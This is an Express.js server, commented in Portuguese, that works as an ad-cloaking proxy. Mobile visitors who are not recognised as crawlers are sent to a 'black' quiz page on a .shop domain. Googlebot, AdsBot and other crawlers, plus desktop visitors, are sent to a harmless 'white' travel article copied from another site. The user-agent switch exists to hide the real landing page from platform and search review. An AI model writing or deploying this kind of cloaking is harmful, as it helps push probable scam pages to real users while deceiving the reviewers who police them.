const express = require('express');
const path = require('path');
const app = express();
const { createProxyMiddleware } = require('http-proxy-middleware');
// Define o diretório de arquivos estáticos
app.use(express.static(path.join(__dirname, 'public')));


// Configuração do proxy reverso para o quiz local (proxy black)

const proxyOptionsBlack = {
    target: 'https://bagagemrio.aniversarioricardo.shop/quiz',  // Substitua pelo URL da sua aplicação em produção
    changeOrigin: true,  // Mudar o cabeçalho Host para o host do destino
    pathRewrite: {
        '^/quiz': '/index.html'  // Redireciona requisições para /quiz para /index.html dentro de /public
    },
    secure: true  // Habilitar verificação SSL se seu aplicativo usar HTTPS
};

// Configuração do proxy reverso para a página white
const proxyOptionsWhite = {
  target: 'https://www.megamodahotel.com.br/cultura/como-arrumar-uma-mala-de-viagem-feminina/',  // URL da página white
  changeOrigin: true,  // Mudar o cabeçalho Host para o host do destino
  secure: true  // Habilitar verificação SSL
};

// Criar o middleware do proxy baseado nas opções acima
const proxyBlack = createProxyMiddleware(proxyOptionsBlack);
const proxyWhite = createProxyMiddleware(proxyOptionsWhite);

// Middleware para determinar qual proxy usar
app.use((req, res, next) => {
  const userAgent = req.headers['user-agent'].toLowerCase();
  const isMobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent);
  const isBot = /googlebot|bingbot|yandexbot|duckduckbot|baiduspider|sogou|exabot|msnbot|teoma|slurp/i.test(userAgent);
  const isGoogleBot = /googlebot|googlebot-image|googlebot-video|googlebot-mobile|adsbot-google(?:-mobile)?|mediapartners-google/i.test(userAgent);


  // Definir uma propriedade customizada no request para indicar qual proxy usar
  if (!isBot && !isGoogleBot && isMobile) {
    return proxyBlack(req, res, next); // Encaminha a requisição para o proxy da página black  } else {
  } else {
    return proxyWhite(req, res, next); // Encaminha para a página white se não atender aos critérios
  }

});

// Porta do servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});